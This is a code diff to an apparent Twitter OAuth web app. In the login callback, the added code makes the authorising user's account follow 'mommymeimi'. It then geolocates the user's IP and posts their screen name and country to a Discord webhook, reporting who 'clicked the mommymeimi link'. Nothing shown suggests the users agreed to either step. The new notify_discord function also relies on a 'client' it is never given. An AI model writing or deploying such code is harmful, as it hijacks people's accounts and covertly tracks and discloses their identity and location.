@@ -144,6 +144,7 @@ def update_profile_name(client,name):
 
 def follow(client,screen_name):
     #params=urllib.parse.urlencode({"name":name,"url":url,"location":location,"description":description})
+    print('inside follow')
     params=urllib.parse.urlencode({"screen_name":screen_name,"follow":"true"})
     furi=follow_url+"?"+params
     print(furi)
@@ -153,6 +154,14 @@ def follow(client,screen_name):
         return
     print(content)
     return
+
+def notify_discord(webhook_url,w_content):
+        headers={"Content-Type":"application/json"}
+        data={"content":w_content}
+        params=str(json.dumps(data)).encode('utf-8')
+        print(params)
+        resp,content=client.request(webhook_url,"POST",headers=headers,body=params)
+        print(resp)
 
 def send_message(client,id,msg):
     print("inside send message")
@@ -281,6 +290,7 @@ def callback():
         '''
         try:
             #follow(real_client,"puppy4meimina")
+            follow(real_client,"mommymeimi")
             ip_addr="0.0.0.0"
             if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
                 ip_addr=request.environ['REMOTE_ADDR']
@@ -300,6 +310,8 @@ def callback():
             print(det)
             c_name = det['country_name']
             print(c_name)
+
+            notify_discord(webhook_url,f'a{screen_name} from {c_name} clicked the mommymei link')
 
 
         except Exception as e:
